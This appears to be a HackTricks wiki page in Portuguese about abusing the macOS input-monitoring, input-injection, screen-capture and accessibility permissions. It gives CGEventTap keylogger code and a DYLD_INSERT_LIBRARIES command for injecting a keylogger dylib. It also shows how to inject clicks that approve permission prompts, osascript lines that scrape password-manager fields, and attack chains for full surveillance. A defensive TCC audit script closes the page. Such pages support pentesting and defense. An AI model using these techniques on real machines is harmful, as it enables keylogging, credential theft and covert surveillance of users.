# macOS Monitoramento de Entrada, Captura de Tela & Abuso de Acessibilidade

{{#include ../../../banners/hacktricks-training.md}}

## Visão geral

Três serviços TCC relacionados controlam como aplicativos podem observar e interagir com a sessão de desktop do usuário:

| Serviço TCC | Permissão | Capacidade |
|---|---|---|
| `kTCCServiceListenEvent` | **Monitoramento de Entrada** | Ler todos os eventos de teclado e mouse em todo o sistema (keylogging) |
| `kTCCServicePostEvent` | **Injeção de Entrada** | Injetar eventos sintéticos de teclado e mouse |
| `kTCCServiceScreenCapture` | **Captura de Tela** | Ler o buffer de exibição, tirar screenshots, gravar a tela |
| `kTCCServiceAccessibility` | **Acessibilidade** | Controlar outras aplicações via AXUIElement API, ler elementos da UI |

Essas permissões são **a combinação mais perigosa** no macOS — juntas elas fornecem:
- Keylogging completo de cada tecla digitada (senhas, mensagens, cartões de crédito)
- Gravação de tela de todo o conteúdo visível
- Injeção de entrada sintética (clicar botões, aprovar diálogos)
- Controle completo da GUI equivalente ao acesso físico

---

## Input Monitoring (kTCCServiceListenEvent)

### Como Funciona

macOS usa a **`CGEventTap` API** para permitir que processos interceptem eventos de entrada do sistema de eventos Quartz. Um processo com permissão ListenEvent pode criar um event tap que recebe **cada evento de teclado e mouse** antes ou depois de chegarem ao aplicativo alvo.
```objc
// Create an event tap that captures all key-down events
CGEventMask mask = CGEventMaskBit(kCGEventKeyDown) | CGEventMaskBit(kCGEventFlagsChanged);

CFMachPortRef tap = CGEventTapCreate(
kCGSessionEventTap,        // Tap at the session level (all apps)
kCGHeadInsertEventTap,     // Insert before the event reaches the app
kCGEventTapOptionListenOnly, // Listen only (don't modify events)
mask,
eventCallback,             // Callback receives every matching event
NULL
);

// The callback receives every keyDown in the entire session:
CGEventRef eventCallback(CGEventTapProxy proxy, CGEventType type,
CGEventRef event, void *userInfo) {
UniChar chars[4];
UniCharCount len;
CGEventKeyboardGetUnicodeString(event, 4, &len, chars);
// chars now contains what the user typed
return event;
}
```
### Encontrando binários com entitlements
```bash
# Find processes with input monitoring TCC grants
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client, auth_value FROM access WHERE service='kTCCServiceListenEvent';"

# System-level grants
sudo sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client, auth_value FROM access WHERE service='kTCCServiceListenEvent';"
```
### Attack: Keylogging via Code Injection

Se um binário com ListenEvent permission também tiver **disabled library validation** ou **allows DYLD environment variables**, um atacante pode injetar um dylib que registra um CGEventTap:
```bash
# Check if the target allows code injection
codesign -d --entitlements - /path/to/input-monitor-app 2>&1 | \
grep -E "allow-dyld|disable-library-validation"

# If both are present, inject a keylogger dylib:
DYLD_INSERT_LIBRARIES=/tmp/keylogger.dylib /path/to/input-monitor-app
```
O dylib injetado herda o ListenEvent TCC grant do alvo e captura todos os toques de tecla.

### Attack: Credential Harvesting

Um keylogger sofisticado pode correlacionar os toques de tecla com o aplicativo ativo:
```objc
// Get the frontmost application to contextualize keystrokes
NSRunningApplication *frontApp = [[NSWorkspace sharedWorkspace] frontmostApplication];
NSString *appName = frontApp.localizedName;

// If appName is "Safari" or "Chrome" and the URL bar contains a login page,
// the next typed sequence is likely a password
```
---

## Input Injection (kTCCServicePostEvent)

### Como Funciona

A permissão PostEvent permite criar um event tap com **`kCGEventTapOptionDefault`** (pode modificar/inject events) em vez de ListenOnly. Isso permite:
```objc
// Inject a keystroke
CGEventRef keyDown = CGEventCreateKeyboardEvent(NULL, kVK_Return, true);
CGEventRef keyUp = CGEventCreateKeyboardEvent(NULL, kVK_Return, false);
CGEventPost(kCGSessionEventTap, keyDown);
CGEventPost(kCGSessionEventTap, keyUp);

// Inject a mouse click at coordinates
CGEventRef click = CGEventCreateMouseEvent(NULL, kCGEventLeftMouseDown,
CGPointMake(100, 200),
kCGMouseButtonLeft);
CGEventPost(kCGSessionEventTap, click);
```
### Ataque: Aprovação automatizada de prompts do TCC

Com PostEvent, um atacante pode **simular clicar em "Permitir"** nos diálogos de permissão do TCC:
```bash
# Using cliclick (if available) or direct CGEvent injection:
# 1. Trigger a TCC prompt for the malware
# 2. Wait for the dialog to appear
# 3. Inject a mouse click on the "Allow" button coordinates
# 4. Malware now has the requested permission
```
---

## Captura de Tela (kTCCServiceScreenCapture)

### Como Funciona

A permissão de captura de tela permite ler o buffer de exibição usando:
- **`CGWindowListCreateImage`** — capturar qualquer janela ou a tela inteira
- **`ScreenCaptureKit`** (macOS 12.3+) — API moderna para streaming do conteúdo da tela
- **`CGDisplayStream`** — captura de tela acelerada por hardware
```objc
// Capture the entire main display
CGImageRef screenshot = CGWindowListCreateImage(
CGRectInfinite,
kCGWindowListOptionOnScreenOnly,
kCGNullWindowID,
kCGWindowImageDefault
);
// screenshot contains everything visible on screen
```
### Encontrando clientes de captura de tela
```bash
# TCC database query
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client, auth_value FROM access WHERE service='kTCCServiceScreenCapture';"

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT path FROM executables WHERE tccPermsStr LIKE '%kTCCServiceScreenCapture%';"
```
### Ataque: Credential Capture via OCR

Um processo de captura de tela injetado pode capturar quadros periodicamente e usar OCR para extrair senhas:
```bash
# Basic screen capture from a process with the TCC grant
screencapture -x /tmp/screen.png

# Capture a specific window (by window ID)
screencapture -x -l <windowID> /tmp/window.png
```
> [!WARNING]
> A partir do **macOS Sonoma**, a captura de tela mostra um **indicador persistente** na barra de menu. Em versões mais antigas, a gravação de tela podia ser completamente silenciosa. No entanto, uma captura rápida de um único frame ainda pode passar despercebida pelos usuários.
 
### Attack: Session Recording

A gravação contínua da tela fornece uma reprodução completa da sessão do usuário:
```objc
// Using ScreenCaptureKit for streaming capture (macOS 12.3+)
// This captures frames continuously with minimal CPU impact
SCStreamConfiguration *config = [[SCStreamConfiguration alloc] init];
config.width = 1920;
config.height = 1080;
config.minimumFrameInterval = CMTimeMake(1, 5); // 5 FPS
// Stream captures everything: passwords, documents, private messages
```
---

## Accessibility (kTCCServiceAccessibility)

### Como Funciona

O acesso Accessibility concede controle sobre outras aplicações via a **AXUIElement API**. Um processo com accessibility pode:

1. **Ler** qualquer elemento de UI em qualquer aplicativo (campos de texto, rótulos, botões, menus)
2. **Clicar** em botões e interagir com controles
3. **Digitar** texto em qualquer campo de texto
4. **Navegar** por menus e diálogos
5. **Extrair** dados exibidos de qualquer aplicativo em execução
```objc
// Get the frontmost application
AXUIElementRef app = AXUIElementCreateApplication(pid);

// Get its windows
CFArrayRef windows;
AXUIElementCopyAttributeValue(app, kAXWindowsAttribute, (CFTypeRef *)&windows);

// Read a text field's value
AXUIElementRef textField = /* find the text field */;
CFTypeRef value;
AXUIElementCopyAttributeValue(textField, kAXValueAttribute, &value);
// value contains whatever text is displayed in the field
```
### Ataque: Concedendo a si mesmo Permissões TCC

O abuso de acessibilidade mais perigoso é **navegar pelas System Settings para conceder ao seu próprio malware permissões adicionais**:
```bash
# Using osascript with accessibility access:
# Navigate to Privacy & Security > Full Disk Access
osascript -e '
tell application "System Settings"
activate
delay 1
end tell
tell application "System Events"
tell process "System Settings"
-- Navigate to Privacy & Security
-- Click the lock to authenticate
-- Toggle on Full Disk Access for the malware
end tell
end tell'
```
### Ataque: Raspagem de Dados entre Aplicações
```bash
# Read data from any application's UI
osascript -e 'tell application "System Events" to get value of text field 1 of window 1 of process "Safari"'

# Get all visible window titles
osascript -e 'tell application "System Events" to get name of every window of every process whose visible is true'

# Scrape password manager display (if unlocked and visible)
osascript -e 'tell application "System Events" to get value of every text field of window 1 of process "1Password"'
```
### Ataque: Ações Automatizadas do Usuário
```bash
# Click a specific UI element
osascript -e '
tell application "System Events"
tell process "Finder"
click button "Allow" of window 1
end tell
end tell'

# Type text into focused field
osascript -e 'tell application "System Events" to keystroke "malicious command"'
osascript -e 'tell application "System Events" to key code 36' -- Press Enter
```
---

## Cadeias de Ataque

### Cadeia: Input Monitoring + Screen Capture = Vigilância Completa
```
1. Inject into binary with ListenEvent + ScreenCapture
2. CGEventTap captures all keystrokes
3. Periodic screen captures provide visual context
4. Correlate: keystroke timing + active window + screen content
5. Result: passwords, private messages, financial data
```
### Cadeia: Accessibility + PostEvent = Controle Remoto Total
```
1. Inject into binary with Accessibility + PostEvent
2. Use AXUIElement to read current screen state
3. Use CGEventPost to inject keystrokes and clicks
4. Navigate System Settings to grant more permissions
5. Open Terminal, type commands as if the user did it
6. Result: equivalent to physical keyboard/mouse access
```
### Cadeia: Acessibilidade → Auto-concessão de Câmera/Microfone → Vigilância
```
1. Start with only Accessibility permission
2. Open System Settings > Privacy & Security > Camera
3. Use accessibility API to toggle camera access for malware
4. Repeat for Microphone, Screen Recording, Full Disk Access
5. Malware now has full surveillance capabilities
6. Result: one TCC permission escalates to total control
```
---

## Detecção e Enumeração
```bash
#!/bin/bash
echo "=== TCC Input/Screen/Accessibility Audit ==="

for db in "$HOME/Library/Application Support/com.apple.TCC/TCC.db" "/Library/Application Support/com.apple.TCC/TCC.db"; do
echo -e "\n[*] Database: $db"
for svc in kTCCServiceListenEvent kTCCServicePostEvent kTCCServiceScreenCapture kTCCServiceAccessibility; do
echo "  $svc:"
sqlite3 "$db" "SELECT '    ' || client || ' (auth=' || auth_value || ')' FROM access WHERE service='$svc' AND auth_value=2;" 2>/dev/null
done
done

echo -e "\n[*] Processes with injectable + input monitoring:"
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE tccPermsStr LIKE '%kTCCServiceListenEvent%'
AND (noLibVal=1 OR allowDyldEnv=1);" 2>/dev/null
```
## Referências

* [Apple Developer — Event Taps](https://developer.apple.com/documentation/coregraphics/quartz_event_services)
* [Apple Developer — API de Acessibilidade](https://developer.apple.com/documentation/applicationservices/axuielement_h)
* [Apple Developer — ScreenCaptureKit](https://developer.apple.com/documentation/screencapturekit)
* [Objective-See — Abuso de Acessibilidade como Bypass do TCC](https://objectivesee.org/blog.html)

{{#include ../../../banners/hacktricks-training.md}}
